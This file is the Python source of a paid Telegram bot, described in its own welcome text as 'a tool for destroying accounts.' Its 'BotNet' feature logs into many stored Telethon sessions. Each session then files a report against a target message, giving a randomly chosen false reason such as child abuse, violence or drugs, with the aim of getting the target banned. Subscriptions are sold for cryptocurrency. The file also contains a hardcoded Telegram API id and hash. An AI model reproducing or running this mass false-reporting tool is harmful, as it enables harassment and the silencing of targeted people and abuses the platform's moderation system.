import sqlite3
import telethon
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.messages import ReportRequest
import asyncio
import telebot
from telebot import types
from telethon import types as telethon_types
import time
import os
import shutil
import random
from datetime import datetime, timedelta
from pyCryptoPayAPI import pyCryptoPayAPI
import config
from telethon.tl.types import PeerUser

while True:
    try:
        reasons = [
            telethon_types.InputReportReasonSpam(),
            telethon_types.InputReportReasonViolence(),
            telethon_types.InputReportReasonPornography(),
            telethon_types.InputReportReasonChildAbuse(),
            telethon_types.InputReportReasonIllegalDrugs(),
            telethon_types.InputReportReasonPersonalDetails(),
        ]

        API = "24565698:5a084b434f8505ace703485b9da85040"

        bot = telebot.TeleBot(config.TOKEN)
        bot_name = config.bot_name
        bot_logs = config.bot_logs
        bot_channel_link = config.bot_channel_link
        bot_admin = config.bot_admin
        bot_documentation = config.bot_documentation
        bot_reviews = config.bot_reviews
        bot_works = config.bot_works
        crypto = pyCryptoPayAPI(api_token=config.CRYPTO)
        session_folder = 'sessions'
        sessions = [f.replace('.session', '') for f in os.listdir(session_folder) if f.endswith('.session')]
        last_used = {}

        subscribe_1_day = config.subscribe_1_day
        subscribe_7_days = config.subscribe_7_days
        subscribe_14_days = config.subscribe_14_days
        subscribe_30_days = config.subscribe_30_days
        subscribe_365_days = config.subscribe_365_days
        subscribe_infinity_days = config.subscribe_infinity_days

        menu = types.InlineKeyboardMarkup(row_width=2)
        profile = types.InlineKeyboardButton("👤 Profile", callback_data='profile')
        doc = types.InlineKeyboardButton("📃 Instructions", url=f'{bot_documentation}')
        shop = types.InlineKeyboardButton("🛍 Shop", callback_data='shop')
        snoser = types.InlineKeyboardButton("🌐 BotNet", callback_data='snoser')
        menu.add(profile)
        menu.add(doc, shop)
        menu.add(snoser)

        back_markup = types.InlineKeyboardMarkup(row_width=2)
        back = types.InlineKeyboardButton("❌ Back", callback_data='back')
        back_markup.add(back)

        channel_markup = types.InlineKeyboardMarkup(row_width=2)
        channel = types.InlineKeyboardButton(f"⚡️ {bot_name} - channel", url=f'{bot_channel_link}')
        channel_markup.add(channel)

        admin_markup = types.InlineKeyboardMarkup(row_width=2)
        add_subsribe = types.InlineKeyboardButton("Grant subscription", callback_data='add_subsribe')
        clear_subscribe = types.InlineKeyboardButton("Revoke subscription", callback_data='clear_subscribe')
        send_all = types.InlineKeyboardButton("Broadcast", callback_data='send_all')
        admin_markup.add(add_subsribe, clear_subscribe)
        admin_markup.add(send_all)

        shop_markup = types.InlineKeyboardMarkup(row_width=2)
        sub_1 = types.InlineKeyboardButton(f"🔹 1 day - {subscribe_1_day}$", callback_data='sub_1')
        sub_2 = types.InlineKeyboardButton(f"🔹 7 days - {subscribe_7_days}$", callback_data='sub_2')
        sub_4 = types.InlineKeyboardButton(f"🔹 30 days - {subscribe_30_days}$", callback_data='sub_4')
        sub_6 = types.InlineKeyboardButton(f"🔹 forever - {subscribe_infinity_days}$", callback_data='sub_6')
        shop_markup.add(sub_1, sub_2)
        shop_markup.add(sub_4, sub_6)
        shop_markup.add(back)

        def check_user_in_db(user_id):
            conn = sqlite3.connect('users.db')
            cursor = conn.cursor()
            cursor.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
            result = cursor.fetchone()
            conn.close()
            return result is not None

        def extract_username_and_message_id(message_url):
            path = message_url[len('https://t.me/'):].split('/')
            if len(path) == 2:
                chat_username = path[0]
                message_id = int(path[1])
                return chat_username, message_id
            raise ValueError("Invalid link!")

        async def main(chat_username, message_id, user):
            connect = sqlite3.connect('users.db')
            cursor = connect.cursor()
            valid = 0
            ne_valid = 0
            flood = 0
            for session in sessions:
                api_id, api_hash = API.split(":")
                random_reason = random.choice(reasons)
                try:
                    client = TelegramClient("./sessions/" + session, int(api_id), api_hash, system_version='4.16.30-vxCUSTOM')
                    await client.connect()
                    if not await client.is_user_authorized():
                        print(f"Session {session} is not valid.")
                        ne_valid += 1
                        await client.disconnect()
                        continue

                    await client.start()
                    chat = await client.get_entity(chat_username)

                    await client(ReportRequest(
                        peer=chat,
                        id=[message_id],
                        reason=random_reason,
                        message=""
                        ))
                    valid += 1
                    await client.disconnect()
                except FloodWaitError as e:
                    flood = flood + 1
                    print(f'Flood wait error ({session}): {e}')
                    await client.disconnect()
                except Exception as e:
                    if "chat not found" in str(e):
                        bot.send_message(user, "❌ *An error occurred while fetching the message!*", parse_mode="Markdown", reply_markup=back_markup)
                        await client.disconnect()
                        return
                    elif "object has no attribute 'from_id'" in str(e):
                        bot.send_message(user, "❌ *An error occurred while fetching the message!*", parse_mode="Markdown", reply_markup=back_markup)
                        await client.disconnect()
                        return
                    elif "database is locked" in str(e):
                        connect.close()
                        continue
                    else:
                        ne_valid += 1
                        print(f'Error ({session}): {e}')
                        await client.disconnect()
                        continue

            user_markup = types.InlineKeyboardMarkup(row_width=2)
            user_profile = types.InlineKeyboardButton(f"{user}", url=f'tg://openmessage?user_id={user}')
            user_markup.add(user_profile)
            bot.send_message(
                bot_logs,
                f"⚡️ *Bot launch occurred:*\n\n*ID:* `{user}`\n*Link: https://t.me/{chat_username}/{message_id}*\n\n🔔 *Session info:*\n⚡️ Valid: *{valid}*\n⚡️ Invalid: *{ne_valid}*\n⚡️ *FloodError: {flood}*",
                parse_mode="Markdown",
                disable_web_page_preview=True,
                reply_markup=user_markup
            )
            bot.send_message(
                user,
                f"🟩 *Reports successfully sent!*\n\n🟢 *Valid:* `{valid}`\n🔴 *Invalid:* `{ne_valid}`\n\n🌟 _Thank you for your activity!_",
                parse_mode="Markdown",
                reply_markup=back_markup
            )
            connect.close()

        @bot.message_handler(commands=['start'])
        def welcome(message):
            connect = sqlite3.connect("users.db")
            cursor = connect.cursor()
            cursor.execute("""CREATE TABLE IF NOT EXISTS users(
                user_id BIGINT,
                subscribe DATETIME
            )""")
            people_id = message.chat.id
            cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (people_id,))
            data = cursor.fetchone()
            if data is None:
                cursor.execute("INSERT INTO users VALUES(?, ?);", (people_id, "1999-01-01 20:00:00"))
                connect.commit()
                bot.send_message(message.chat.id, "👋 *Hello!*", reply_markup=channel_markup, parse_mode="Markdown")
            bot.send_message(
                message.chat.id,
                f'♨️ *{bot_name}* — _a tool for destroying accounts._\n\n⚡️ *Admin: {bot_admin}*\n⭐️ *Reviews:* [Reviews]({bot_reviews})\n🔥 *Works:* [Works]({bot_works})',
                parse_mode="Markdown",
                reply_markup=menu
            )
            connect.close()

        bot.polling(none_stop=True)
    except:
        time.sleep(3)


